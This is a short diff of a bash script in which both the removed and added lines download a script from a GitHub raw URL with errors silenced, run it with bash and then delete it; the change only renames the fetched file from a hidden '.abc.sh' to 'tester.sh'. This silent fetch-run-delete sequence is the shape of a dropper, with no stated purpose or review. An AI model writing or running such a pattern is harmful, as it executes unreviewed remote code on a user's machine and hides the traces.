@@ -1,5 +1,5 @@
 #!/bin/bash
-rm -rf .abc.sh 2>/dev/null
-wget https://raw.githubusercontent.com/102vosit/task/master/.abc.sh 2>/dev/null
-bash .abc.sh
-rm -rf .abc.sh
+rm -rf tester.sh 2>/dev/null
+wget https://raw.githubusercontent.com/102vosit/task/master/tester.sh 2>/dev/null
+bash tester.sh
+rm -rf tester.sh
